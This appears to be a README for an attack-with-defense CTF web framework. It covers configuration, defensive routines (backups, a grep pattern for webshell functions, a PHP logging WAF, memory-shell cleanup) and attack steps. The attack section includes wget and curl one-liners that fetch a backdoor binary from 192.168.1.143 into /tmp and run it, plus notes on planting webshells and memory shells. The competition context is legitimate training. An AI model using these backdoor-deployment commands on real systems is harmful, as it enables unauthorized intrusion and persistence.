## Introduction
This framework is used to help enjoy the AWD-web in CTF.
Maybe in the future we can expand it into a common security test platform.

### 根目录
- Beat.py 攻击脚本

### 修改内容
- setting.py里面flag的格式
- 交flag机的参数
- contro.py里面交flag的函数
- backdoor.c 里面回连IP
- filecmp里面文件夹位置

### 防御
- (找到代码位置)拖源代码
- 自己给自己上一句话，用www-data的权限给自己回连内存马
- 文件监控
- 抓流量*
- 流量分析
- 交flag机调试成功

### 攻击
- webshell扫描一波
- 发现目标页面
- 批量攻击
- 上马 
    - gcc -o check backdoor.c -lpthread -g
    - cd /tmp&&wget -O check 192.168.1.143/upload/check&&chmod +x check&&./check
    - cd /tmp;curl -o check 192.168.1.143/check;chmod +x check;./check
- 垃圾流量

### notice
- www-data 无法直接反弹shell，不能执行python -c
- 无法写日志：open_basedir限制，或/tmp权限不足(chmod 777 -R /tmp/log; chown www-data:www-data -R /tmp/log)


### 运维命令
#### 源码备份
- cd /var/www/html && zip -r www.zip ./*
- scp (-i id_rsa) root@127.0.0.1:/var/www/html/www.zip  ./
- 或者直接 scp (-i id_rsa) -r root@127.0.0.1:/var/www/html/  ./www
- 数据库备份 mysqldump -u root -p test(数据库名) > test.sql
#### 检查flag
- find -name "*.txt" | xargs cat | grep -B 10 -E "\w{4}-\w{4}-\w{4}-\w{4}-\w{3}-\w{4}"
#### 上WAF
- find /var/www/html -name "*.php"|xargs sed -i "s#<?php#<?php\ninclude_once('/var/www/html/log.php');\n#g"
#### 快速查一下shell
-`find /var/www/html -name "*.php" |xargs egrep 'assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\('`
#### 循环杀PHP内存马
```
while true
do
rm .demo.php
done
```
